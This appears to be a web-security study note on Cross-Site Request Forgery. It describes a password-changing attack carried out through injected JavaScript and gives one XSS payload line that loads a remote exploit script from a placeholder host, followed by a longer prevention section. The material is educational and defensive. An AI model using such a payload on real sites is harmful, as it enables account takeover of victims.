### TLDR
- **CSRF Overview**: Cross-Site Request Forgery (CSRF) occurs due to unfiltered user input, enabling attackers to perform actions on a web application as an authenticated user, often leveraging XSS vulnerabilities or HTTP parameters.
- **Common Attack Scenario**: Attackers may craft a JavaScript payload to change a victim's password. When the victim views the malicious payload, the JavaScript executes, using the victim's session to alter their password, granting the attacker account control.
- **Targeting Admins**: CSRF attacks can target admins to gain access to sensitive functions, potentially compromising back-end servers.
- **Developing Exploits**: Attackers may use a remote `.js` file (e.g., `exploit.js`) containing malicious JavaScript tailored to the application's API and password-changing procedure.
```html
"><script src=//www.example.com/exploit.js></script>
```



### Prevention
- **Front-End Input Sanitization**: Always filter and sanitize user input on the front end to prevent malicious code from reaching the back end or being directly displayed on the client-side.
- **Two Key Controls**: Validate and sanitize both user input and displayed output to mitigate risks from attacks like HTML Injection, XSS, and CSRF, even if attackers bypass other filters.
- **Web Application Firewalls (WAF)**: A WAF can help block injection attempts automatically but is not foolproof; developers should follow best practices instead of solely relying on WAFs.
- **Anti-CSRF Measures**: Modern browsers and web applications often implement anti-CSRF protections, such as anti-CSRF tokens, `http-only` cookies, and `X-XSS-Protection` headers. Additional functional-level measures, like requiring password input for sensitive actions, can also help.
- **Limitations of Protections**: While these measures reduce the risk, they can still be bypassed, so secure coding practices remain essential.
- **Further Guidance**: Refer to OWASP's [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) for detailed prevention strategies.

| Type | Description |
| --- | --- |
| `Sanitization` | Removing special characters and non-standard characters from user input before displaying it or storing it. |
| `Validation` | Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format) |
